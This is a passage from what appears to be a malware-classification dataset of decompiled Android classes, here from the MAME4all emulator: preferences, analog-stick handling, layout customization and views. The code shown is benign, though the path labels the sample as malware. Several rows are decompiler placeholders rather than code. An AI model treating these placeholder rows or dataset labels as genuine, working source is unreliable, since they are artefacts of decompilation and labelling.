getSharedPreferences().getBoolean(PREF_ANIMATED_INPUT,true);   }   public boolean isTouchDZ(){     return getSharedPreferences().getBoolean(PREF_TOUCH_DZ,true);   }   public boolean isASMCores(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_ASMCORES,true);   }   public boolean isShowInfoWarnings(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_SHOW_INFOWARNINGS,true);   }   public int getControllerType(){     return Integer.valueOf(getSharedPreferences().getString(PREF_CONTROLLER_TYPE,""2"")).intValue();   }   public int getInputExternal(){     return Integer.valueOf(getSharedPreferences().getString(PREF_INPUT_EXTERNAL,""1"")).intValue();   }   public int getAnalogDZ(){     return Integer.valueOf(getSharedPreferences().getString(PREF_ANALOG_DZ,""1"")).intValue();   }   public boolean isVibrate(){     return getSharedPreferences().getBoolean(PREF_VIBRATE,true);   }   public String getROMsDIR(){     return getSharedPreferences().getString(PREF_ROMsDIR,null);   }   public void setROMsDIR(  String value){     SharedPreferences.Editor editor=getSharedPreferences().edit();     editor.putString(PREF_ROMsDIR,value);     editor.commit();   }   public String getDefinedControlLayout(){     return getSharedPreferences().getString(PREF_DEFINED_CONTROL_LAYOUT,null);   }   public void setDefinedControlLayout(  String value){     SharedPreferences.Editor editor=getSharedPreferences().edit();     editor.putString(PREF_DEFINED_CONTROL_LAYOUT,value);     editor.commit();   }   public boolean isTiltSensor(){     return getSharedPreferences().getBoolean(PREF_TILT_SENSOR,false);   }   public int getTiltSensitivity(){     return getSharedPreferences().getInt(PREF_TILT_SENSITIVITY,6);   }   public int getTiltDZ(){     return Integer.valueOf(getSharedPreferences().getString(PREF_TILT_DZ,""3"")).intValue();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\AnalogStick.code","public class AnalogStick implements IController {   static BitmapDrawable inner_img=null;   static BitmapDrawable outer_img=null;   static BitmapDrawable[] stick_images=null;   float ang;   float mag;   float oldRx;   float oldRy;   float rx;   float ry;   int stickHeight;   int stickWidth;   float MY_PI=3.1415927f;   Rect rStickArea=new Rect();   Rect stickPos=new Rect();   Point ptCur=new Point();   Point ptCenter=new Point();   Point ptMin=new Point();   Point ptMax=new Point();   float deadZone=0.1f;   int motion_pid=-1;   protected MAME4all mm=null;   public final float rad2degree(  float r){     return (180.0f * r) / this.MY_PI;   }   public void setMAME4all(  MAME4all value){     this.mm=value;     if (inner_img == null) {       inner_img=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_inner);     }     if (outer_img == null) {       outer_img=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_outer);     }     if (stick_images == null) {       stick_images=new BitmapDrawable[9];       stick_images[7]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_down);       stick_images[6]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_down_left);       stick_images[8]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_down_right);       stick_images[4]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_left);       stick_images[0]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_none);       stick_images[5]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_right);       stick_images[2]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_up);       stick_images[1]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_up_left);       stick_images[3]=(BitmapDrawable)this.mm.getResources().getDrawable(R.drawable.stick_up_right);     }   }   public void setStickArea(  Rect rStickArea){     this.rStickArea=rStickArea;     this.ptMin.x=rStickArea.left;     this.ptMin.y=rStickArea.top;     this.ptMax.x=rStickArea.right;     this.ptMax.y=rStickArea.bottom;     this.ptCenter.x=rStickArea.centerX();     this.ptCenter.y=rStickArea.centerY();     this.stickWidth=(int)(rStickArea.width() * 0.62f);     this.stickHeight=(int)(rStickArea.height() * 0.62f);     calculateStickPosition(this.ptCenter);   }   protected int updateAnalog(  int pad_data){ switch (this.mm.getPrefsHelper().getAnalogDZ()) { case 0:       this.deadZone=0.01f;     break; case 1:   this.deadZone=0.05f; break; case 2: this.deadZone=0.1f; break; case 3: this.deadZone=0.15f; break; case 4: this.deadZone=0.2f; break; case 5: this.deadZone=0.3f; break; } if (this.mag >= this.deadZone) { int ways=Emulator.getValue(6); boolean b=Emulator.isInMAME(); Emulator.setAnalogData(0,this.rx,this.ry * (-1.0f)); float v=this.ang; if (ways == 2 && b) { if (v < 180.0f) { return (pad_data | 64) & (-2) & (-17)& (-5); } if (v >= 180.0f) { return (pad_data | 4) & (-2) & (-17)& (-65); } return pad_data; } if (ways == 4 && b) { if (v >= 315.0f || v < 45.0f) { return (pad_data | 16) & (-2) & (-5)& (-65); } if (v >= 45.0f && v < 135.0f) { return (pad_data | 64) & (-2) & (-17)& (-5); } if (v >= 135.0f && v < 225.0f) { return (pad_data | 1) & (-17) & (-5)& (-65); } if (v >= 225.0f && v < 315.0f) { return (pad_data | 4) & (-2) & (-17)& (-65); } return pad_data; } if (v >= 330.0f || v < 30.0f) { return (pad_data | 16) & (-2) & (-5)& (-65); } if (v >= 30.0f && v < 60.0f) { return (pad_data | 16 | 64) & (-2) & (-5); } if (v >= 60.0f && v < 120.0f) { return (pad_data | 64) & (-2) & (-17)& (-5); } if (v >= 120.0f && v < 150.0f) { return (pad_data | 64 | 1) & (-17) & (-5); } if (v >= 150.0f && v < 210.0f) { return (pad_data | 1) & (-17) & (-5)& (-65); } if (v >= 210.0f && v < 240.0f) { return (pad_data | 1 | 4) & (-17) & (-65); } if (v >= 240.0f && v < 300.0f) { return (pad_data | 4) & (-2) & (-17)& (-65); } if (v >= 300.0f && v < 330.0f) { return (pad_data | 4 | 16) & (-2) & (-65); } return pad_data; } Emulator.setAnalogData(0,0.0f,0.0f); return pad_data & (-2) & (-17)& (-5)& (-65); } protected void calculateStickState(Point pt,Point min,Point max,Point center){ if (pt.x > max.x) { pt.x=max.x; } if (pt.x < min.x) { pt.x=min.x; } if (pt.y > max.y) { pt.y=max.y; } if (pt.y < min.y) { pt.y=min.y; } if (pt.x == center.x) { this.rx=0.0f; }  else if (pt.x >= center.x) { this.rx=(pt.x - center.x) / (max.x - center.x); }  else { this.rx=((pt.x - min.x) / (center.x - min.x)) - 1.0f; } if (pt.y == center.y) { this.ry=0.0f; }  else if (pt.y >= center.y) { this.ry=(pt.y - center.y) / (max.y - center.y); }  else { this.ry=((pt.y - min.y) / (center.y - min.y)) - 1.0f; } this.ang=rad2degree((float)Math.atan(this.ry / this.rx)); this.ang-=90.0f; if (this.rx < 0.0f) { this.ang-=180.0f; } this.ang=Math.abs(this.ang); this.mag=(float)Math.sqrt((this.rx * this.rx) + (this.ry * this.ry)); } protected void calculateStickPosition(Point pt){ int ways=Emulator.getValue(6); boolean b=Emulator.isInMAME(); if (ways == 2 && b) { this.stickPos.left=Math.min(this.ptMax.x - this.stickWidth,Math.max(this.ptMin.x,pt.x - (this.stickWidth / 2))); this.stickPos.top=this.ptCenter.y - (this.stickHeight / 2); }  else if (ways == 4 && b) { if (this.mm.getInputHandler().getStick_state() == 5 || this.mm.getInputHandler().getStick_state() == 4) { this.stickPos.left=Math.min(this.ptMax.x - this.stickWidth,Math.max(this.ptMin.x,pt.x - (this.stickWidth / 2))); this.stickPos.top=this.ptCenter.y - (this.stickHeight / 2); }  else { this.stickPos.left=this.ptCenter.x - (this.stickWidth / 2); this.stickPos.top=Math.min(this.ptMax.y - this.stickHeight,Math.max(this.ptMin.y,pt.y - (this.stickHeight / 2))); } }  else { this.stickPos.left=Math.min(this.ptMax.x - this.stickWidth,Math.max(this.ptMin.x,pt.x - (this.stickWidth / 2))); this.stickPos.top=Math.min(this.ptMax.y - this.stickHeight,Math.max(this.ptMin.y,pt.y - (this.stickHeight / 2))); } this.stickPos.right=this.stickPos.left + this.stickWidth; this.stickPos.bottom=this.stickPos.top + this.stickHeight; } public int handleMotion(MotionEvent event,int pad_data){ int pid; int action=event.getAction(); int actionEvent=action & MotionEventCompat.ACTION_MASK; int pointerIndex=(65280 & action) >> 8; try { pid=event.getPointerId(pointerIndex); }  catch (Error e) { pid=(action & 8) >> 8; } if (actionEvent == 1 || ((actionEvent == 6 && pid == this.motion_pid) || actionEvent == 3)) { this.ptCur.x=this.ptCenter.x; this.ptCur.y=this.ptCenter.y; this.mag=0.0f; this.ry=0.0f; this.rx=0.0f; this.oldRy=-999.0f; this.oldRx=-999.0f; this.motion_pid=-1; }  else { for (int i=0; i < event.getPointerCount(); i++) { int pointerId=event.getPointerId(i); int x=(int)event.getX(i); int y=(int)event.getY(i); if (this.rStickArea.contains(x,y)) { this.motion_pid=pointerId; } if (this.motion_pid == pointerId) { this.ptCur.x=x; this.ptCur.y=y; calculateStickState(this.ptCur,this.ptMin,this.ptMax,this.ptCenter); } } } int pad_data2=updateAnalog(pad_data); if ((Math.abs(this.oldRx - this.rx) >= 0.08d || Math.abs(this.oldRy - this.ry) >= 0.08d) && this.mm.getPrefsHelper().isAnimatedInput()) { this.oldRx=this.rx; this.oldRy=this.ry; calculateStickPosition(this.mag >= this.deadZone ? this.ptCur : this.ptCenter); if (this.mm.getPrefsHelper().getControllerType() == 3) { if (Emulator.isDebug()) { this.mm.getInputView().invalidate(); }  else { this.mm.getInputView().invalidate(this.rStickArea); } } } return pad_data2; } public void draw(Canvas canvas){ if (this.mm.getPrefsHelper().getControllerType() == 3) { if (this.mm.getMainHelper().getscrOrientation() == 2) { outer_img.setBounds(this.rStickArea); outer_img.setAlpha(this.mm.getInputHandler().getOpacity()); outer_img.draw(canvas); } inner_img.setBounds(this.stickPos); inner_img.setAlpha(this.mm.getInputHandler().getOpacity()); inner_img.draw(canvas); }  else if (this.mm.getPrefsHelper().getControllerType() == 2) { stick_images[this.mm.getInputHandler().getStick_state()].setBounds(this.rStickArea); stick_images[this.mm.getInputHandler().getStick_state()].setAlpha(this.mm.getInputHandler().getOpacity()); stick_images[this.mm.getInputHandler().getStick_state()].draw(canvas); } if (Emulator.isDebug()) { canvas.drawText(""x="" + this.ptCur.x + "" y=""+ this.ptCur.y+ "" state=""+ this.mm.getInputHandler().getStick_state()+ "" rx=""+ this.rx+ "" ry=""+ this.ry+ "" ang=""+ this.ang+ "" mag=""+ this.mag,5.0f,50.0f,Emulator.getDebugPaint()); } } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\ControlCustomizer.code","public class ControlCustomizer {   private static boolean enabled=false;   private InputValue valueMoved=null;   private int ax=0;   private int ay=0;   private int old_ax=0;   private int old_ay=0;   private int prev_ax=0;   private int prev_ay=0;   protected MAME4all mm=null;   public static void setEnabled(  boolean enabled2){     enabled=enabled2;   }   public static boolean isEnabled(){     return enabled;   }   public void setMAME4all(  MAME4all value){     this.mm=value;   }   public void discardDefinedControlLayout(){     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     for (int j=0; j < values.size(); j++) {       InputValue iv=values.get(j);       iv.setOffsetTMP(0,0);       if (iv.getType() == 8) {         this.mm.getInputHandler().getAnalogStick().setStickArea(iv.getRect());       }     }     this.mm.getInputView().updateImages();   }   public void saveDefinedControlLayout(){     StringBuffer definedStr=new StringBuffer();     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     boolean first=true;     for (int j=0; j < values.size(); j++) {       InputValue iv=values.get(j);       iv.commitChanges();       if (iv.getXoff() != 0 || iv.getYoff() != 0) {         if (!first) {           definedStr.append("","");         }         definedStr.append(String.valueOf(iv.getType()) + "","" + iv.getValue()+ "",""+ iv.getXoff()+ "",""+ iv.getYoff());         first=false;       }     }     this.mm.getPrefsHelper().setDefinedControlLayout(definedStr.toString());   }   public void readDefinedControlLayout(){     if (this.mm.getMainHelper().getscrOrientation() == 2) {       String definedStr=this.mm.getPrefsHelper().getDefinedControlLayout();       if (definedStr != null) {         ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();         StringTokenizer tok=new StringTokenizer(definedStr,"","",false);         while (tok.hasMoreTokens()) {           int type=Integer.parseInt(tok.nextToken());           int value=Integer.parseInt(tok.nextToken());           int xoff=Integer.parseInt(tok.nextToken());           int yoff=Integer.parseInt(tok.nextToken());           for (int j=0; j < values.size(); j++) {             InputValue iv=values.get(j);             if (iv.getType() == type && iv.getValue() == value) {               iv.setOffset(xoff,yoff);               if (type == 8) {                 this.mm.getInputHandler().getAnalogStick().setStickArea(iv.getRect());               }             }           }         }       }       this.mm.getInputView().updateImages();     }   }   protected void updateRelatedRects(){     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     if (this.valueMoved.getType() == 3) {       for (int j=0; j < values.size(); j++) {         InputValue iv=values.get(j);         if (iv.getType() == 5 && iv.getValue() == this.valueMoved.getValue()) {           iv.setOffsetTMP(this.valueMoved.getXoff_tmp(),this.valueMoved.getYoff_tmp());           return;         }       }       return;     }     if (this.valueMoved.getType() == 4 || this.valueMoved.getType() == 8) {       for (int j2=0; j2 < values.size(); j2++) {         InputValue iv2=values.get(j2);         if (iv2.getType() == 2 || iv2.getType() == 4 || iv2.getType() == 8) {           iv2.setOffsetTMP(this.valueMoved.getXoff_tmp(),this.valueMoved.getYoff_tmp());         }         if (iv2.getType() == 8) {           this.mm.getInputHandler().getAnalogStick().setStickArea(this.valueMoved.getRect());         }       }     }   }   public void handleMotion(  MotionEvent event){     int action=event.getAction();     int x=(int)event.getX();     int y=(int)event.getY();     if (action == 1 || action == 3) {       this.valueMoved=null;       this.mm.getInputView().invalidate();       this.ax=0;       this.ay=0;       return;     }     if (this.valueMoved != null) {       int new_ax=((Math.abs((x - this.ax) - this.prev_ax) > 5 ? x - this.ax : 0) / 5) * 5;       int new_ay=((Math.abs((y - this.ay) - this.prev_ay) > 5 ? y - this.ay : 0) / 5) * 5;       if (new_ax != 0 || new_ay != 0) {         if (new_ax == 0) {           new_ax=this.prev_ax;         }         this.prev_ax=new_ax;         if (new_ay == 0) {           new_ay=this.prev_ay;         }         this.prev_ay=new_ay;         this.valueMoved.setOffsetTMP(this.prev_ax + this.old_ax,this.prev_ay + this.old_ay);         updateRelatedRects();         this.mm.getInputView().updateImages();         this.mm.getInputView().invalidate();         return;       }       return;     }     ArrayList<InputValue> values=this.mm.getInputHandler().getAllInputData();     for (int j=0; j < values.size(); j++) {       InputValue iv=values.get(j);       if (iv.getRect().contains(x,y) && (iv.getType() == 3 || iv.getType() == 4 || iv.getType() == 8)) {         this.old_ax=iv.getXoff_tmp();         this.old_ay=iv.getYoff_tmp();         this.ax=x;         this.ay=y;         this.valueMoved=iv;         return;       }     }   }   public void draw(  Canvas canvas){     ArrayList<InputValue> ids=this.mm.getInputHandler().getAllInputData();     Paint p2=new Paint();     p2.setARGB(30,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK);     p2.setStyle(Paint.Style.FILL);     for (int i=0; i < ids.size(); i++) {       InputValue v=ids.get(i);       Rect r=v.getRect();       if (r != null) {         if (v.getType() == 3) {           canvas.drawRect(r,p2);         }  else         if (this.mm.getPrefsHelper().getControllerType() == 1 && v.getType() == 2) {           canvas.drawRect(r,p2);         }  else         if (this.mm.getPrefsHelper().getControllerType() != 1 && v.getType() == 8) {           canvas.drawRect(r,p2);         }       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\IController.code","public interface IController {   public static final int A_VALUE=4096;   public static final int BTN_A=1;   public static final int BTN_B=2;   public static final int BTN_L1=4;   public static final int BTN_L2=6;   public static final int BTN_NO_PRESS_STATE=1;   public static final int BTN_PRESS_STATE=0;   public static final int BTN_R1=5;   public static final int BTN_R2=7;   public static final int BTN_SELECT=8;   public static final int BTN_START=9;   public static final int BTN_X=3;   public static final int BTN_Y=0;   public static final int B_VALUE=8192;   public static final int DOWN_VALUE=16;   public static final int L1_VALUE=1024;   public static final int L2_VALUE=65536;   public static final int LEFT_VALUE=4;   public static final int NUM_BUTTONS=10;   public static final int R1_VALUE=2048;   public static final int R2_VALUE=131072;   public static final int RIGHT_VALUE=64;   public static final int SELECT_VALUE=512;   public static final int START_VALUE=256;   public static final int STICK_DOWN=7;   public static final int STICK_DOWN_LEFT=6;   public static final int STICK_DOWN_RIGHT=8;   public static final int STICK_LEFT=4;   public static final int STICK_NONE=0;   public static final int STICK_RIGHT=5;   public static final int STICK_UP=2;   public static final int STICK_UP_LEFT=1;   public static final int STICK_UP_RIGHT=3;   public static final int UP_VALUE=1;   public static final int X_VALUE=16384;   public static final int Y_VALUE=32768; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\InputHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@264b0104"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\InputHandlerExt.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3e10d4d0"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\InputHandlerFactory.code","public class InputHandlerFactory {   public static InputHandler createInputHandler(  MAME4all mm){     try {       MotionEvent.class.getMethod(""getPointerCount"",new Class[0]);       return new InputHandlerExt(mm);     }  catch (    NoSuchMethodException e) {       return new InputHandler(mm);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\InputValue.code","public class InputValue {   private MAME4all mm;   private int o_x1;   private int o_x2;   private int o_y1;   private int o_y2;   private int type;   private int value;   private float dx=1.0f;   private float dy=1.0f;   private int ax=0;   private int ay=0;   private int xoff_tmp=0;   private int yoff_tmp=0;   private int xoff=0;   private int yoff=0;   private Rect rect=null;   private Rect origRect=null;   public InputValue(  int[] d,  MAME4all mm){     this.mm=null;     this.mm=mm;     this.type=d[0];     this.value=d[1];     if (this.type == 2 && mm.getPrefsHelper().isTouchDZ()) {       if (this.value == 4) {         d[4]=(int)(d[4] - (d[4] * 0.18f));       }       if (this.value == 5) {         d[2]=(int)(d[2] + (d[4] * 0.18f));         d[4]=(int)(d[4] - (d[4] * 0.18f));       }     }     this.o_x1=d[2];     this.o_y1=d[3];     this.o_x2=this.o_x1 + d[4];     this.o_y2=this.o_y1 + d[5];   }   public void setFixData(  float dx,  float dy,  int ax,  int ay){     this.dx=dx;     this.dy=dy;     this.ax=ax;     this.ay=ay;     this.rect=null;   }   public void setOffset(  int xoff,  int yoff){     this.xoff=xoff;     this.yoff=yoff;     this.xoff_tmp=0;     this.yoff_tmp=0;     this.rect=null;   }   public void setOffsetTMP(  int xoff_tmp,  int yoff_tmp){     this.xoff_tmp=xoff_tmp;     this.yoff_tmp=yoff_tmp;     this.rect=null;   }   public void commitChanges(){     this.xoff+=this.xoff_tmp;     this.yoff+=this.yoff_tmp;     this.xoff_tmp=0;     this.yoff_tmp=0;   }   public Rect getRect(){     if (this.rect == null) {       this.rect=new Rect(((int)(this.o_x1 * this.dx)) + this.ax + this.xoff+ this.xoff_tmp,((int)(this.o_y1 * this.dy)) + this.ay + this.yoff+ this.yoff_tmp,((int)(this.o_x2 * this.dx)) + this.ax + this.xoff+ this.xoff_tmp,((int)(this.o_y2 * this.dy)) + this.ay + this.yoff+ this.yoff_tmp);     }     return this.rect;   }   public Rect getOrigRect(){     if (this.origRect == null) {       this.origRect=new Rect(this.o_x1,this.o_y1,this.o_x2,this.o_y2);     }     return this.origRect;   }   public int getType(){     return this.type;   }   public int getValue(){     return this.value;   }   public int getXoff_tmp(){     return this.xoff_tmp;   }   public int getYoff_tmp(){     return this.yoff_tmp;   }   public int getXoff(){     return this.xoff;   }   public int getYoff(){     return this.yoff;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.input\TiltSensor.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6c1acbef"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.views\EmulatorViewGL.code","public class EmulatorViewGL extends GLSurfaceView implements IEmuView {   protected MAME4all mm;   protected GLRenderer render;   protected int scaleType;   public GLSurfaceView.Renderer getRender(){     return this.render;   }   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;     this.render.setMAME4all(mm);   }   public EmulatorViewGL(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     this.render=null;     init();   }   public EmulatorViewGL(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     this.render=null;     init();   }   protected void init(){     setKeepScreenOn(true);     setFocusable(true);     setFocusableInTouchMode(true);     requestFocus();     this.render=new GLRenderer();     setRenderer(this.render);     setRenderMode(0);   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     Emulator.setWindowSize(w,h);   }   @Override public boolean onTrackballEvent(  MotionEvent event){     return this.mm.getInputHandler().onTrackballEvent(event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.views\EmulatorViewHW.code","public class EmulatorViewHW extends View implements IEmuView {   protected int fps;   protected int i;   protected long millis;   protected MAME4all mm;   protected int scaleType;   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public EmulatorViewHW(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     this.i=0;     this.fps=0;     init();   }   public EmulatorViewHW(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     this.i=0;     this.fps=0;     init();   }   public EmulatorViewHW(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.scaleType=1;     this.mm=null;     this.i=0;     this.fps=0;     init();   }   protected void init(){     setKeepScreenOn(true);     setFocusable(true);     setFocusableInTouchMode(true);     requestFocus();   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     Emulator.setWindowSize(w,h);   }   @Override public boolean onTrackballEvent(  MotionEvent event){     return this.mm.getInputHandler().onTrackballEvent(event);   }   @Override public void draw(  Canvas canvas){     super.draw(canvas);     this.i++;     if (Emulator.getScreenBuffer() != null) {       canvas.concat(Emulator.getMatrix());       canvas.drawBitmap(Emulator.getScreenBuffPx(),0,Emulator.getEmulatedWidth(),0,0,Emulator.getEmulatedWidth(),Emulator.getEmulatedHeight(),false,(Paint)null);       if (Emulator.isDebug()) {         canvas.drawText(""HW "" + canvas.isHardwareAccelerated() + "" fps:""+ this.fps,5.0f,40.0f,Emulator.getDebugPaint());         if (System.currentTimeMillis() - this.millis >= 1000) {           this.fps=this.i;           this.i=0;           this.millis=System.currentTimeMillis();         }       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.views\EmulatorViewSW.code","public class EmulatorViewSW extends SurfaceView implements SurfaceHolder.Callback, IEmuView {   protected MAME4all mm;   protected int scaleType;   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public EmulatorViewSW(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     init();   }   public EmulatorViewSW(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     init();   }   public EmulatorViewSW(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.scaleType=1;     this.mm=null;     init();   }   protected void init(){     getHolder().addCallback(this);     setFocusable(true);     setFocusableInTouchMode(true);     requestFocus();   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     super.onSizeChanged(w,h,oldw,oldh);     Emulator.setWindowSize(w,h);   }   @Override public void surfaceChanged(  SurfaceHolder holder,  int format,  int width,  int height){   }   @Override public void surfaceCreated(  SurfaceHolder holder){     Emulator.setHolder(holder);   }   @Override public void surfaceDestroyed(  SurfaceHolder holder){     Emulator.setHolder(null);   }   @Override public boolean onTrackballEvent(  MotionEvent event){     return this.mm.getInputHandler().onTrackballEvent(event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.views\FilterView.code","public class FilterView extends View implements IEmuView {   protected MAME4all mm;   protected int scaleType;   @Override public int getScaleType(){     return this.scaleType;   }   @Override public void setScaleType(  int scaleType){     this.scaleType=scaleType;   }   @Override public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public FilterView(  Context context){     super(context);     this.scaleType=1;     this.mm=null;     init();   }   public FilterView(  Context context,  AttributeSet attrs){     super(context,attrs);     this.scaleType=1;     this.mm=null;     init();   }   protected void init(){     setFocusable(false);     setFocusableInTouchMode(false);   }   @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){     ArrayList<Integer> l=this.mm.getMainHelper().measureWindow(widthMeasureSpec,heightMeasureSpec,this.scaleType);     setMeasuredDimension(l.get(0).intValue(),l.get(1).intValue());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.views\IEmuView.code","public interface IEmuView {   int getScaleType();   void setMAME4all(  MAME4all mAME4all);   void setScaleType(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all.views\InputView.code","public class InputView extends ImageView {   protected int ax;   protected int ay;   protected Bitmap bmp;   protected float dx;   protected float dy;   protected MAME4all mm;   protected Paint pnt;   protected Rect rdst;   protected Rect rsrc;   static BitmapDrawable[] stick_images=null;   static BitmapDrawable[][] btns_images=null;   public void setMAME4all(  MAME4all mm){     this.mm=mm;     if (stick_images == null) {       stick_images=new BitmapDrawable[9];       stick_images[7]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_down);       stick_images[6]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_down_left);       stick_images[8]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_down_right);       stick_images[4]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_left);       stick_images[0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_none);       stick_images[5]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_right);       stick_images[2]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_up);       stick_images[1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_up_left);       stick_images[3]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.dpad_up_right);     }     if (btns_images == null) {       btns_images=(BitmapDrawable[][])Array.newInstance((Class<?>)BitmapDrawable.class,10,2);       btns_images[1][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_a);       btns_images[1][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_a_press);       btns_images[2][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_b);       btns_images[2][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_b_press);       btns_images[3][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_x);       btns_images[3][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_x_press);       btns_images[0][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_y);       btns_images[0][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_y_press);       btns_images[4][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l1);       btns_images[4][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l1_press);       btns_images[5][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r1);       btns_images[5][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r1_press);       btns_images[6][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l2);       btns_images[6][0]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_l2_press);       btns_images[7][1]=(BitmapDrawable)mm.getResources().getDrawable(R.drawable.button_r2);       